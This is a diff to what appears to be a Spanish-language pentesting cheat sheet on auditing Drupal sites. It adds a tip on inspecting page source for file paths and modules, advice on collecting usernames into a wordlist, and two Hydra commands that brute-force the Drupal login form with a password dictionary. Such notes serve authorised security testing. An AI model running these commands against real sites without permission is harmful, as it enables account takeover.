@@ -89,3 +89,28 @@ droopescan scan drupal -u <url_drupal> # Análisis básico del sitio Drupal.
 droopescan scan drupal -u <url_drupal> -e plugins, themes # Enumerar módulos y temas instalados.
 ```
 
+💡 Una buena práctica al auditar Drupal es revisar el código fuente de la página web. Ahí podremos encontrar rutas como /sites/default/files/, que pueden revelar archivos accesibles o permitir directory listing, así como información sobre temas y módulos utilizados.
+
+Si encontramos posibles nombres de usuario durante la auditoría, debemos guardarlos en un archivo .txt para consultarlos o utilizarlos como wordlist de usuarios.
+
+## 🔑 Fuerza bruta al panel Login de Drupal.
+
+Fuerza bruta con Hydra
+
+```bash
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt <url> http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login:F=Incorrect username or password."
+```
+
+Ataque a múltiples usuarios:
+
+```bash
+hydra -L <lista_usuarios.txt> -P <diccionario.txt> <url> http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login:F=Incorrect username or password."
+```
+
+----
+
+
+
+<div style="text-align:center; font-size: 0.9em; margint-top: 40px; color: #33ff33;">
+    💻 Hecho con 💚 por <strong>Marcela</strong> - 2025
+</div>
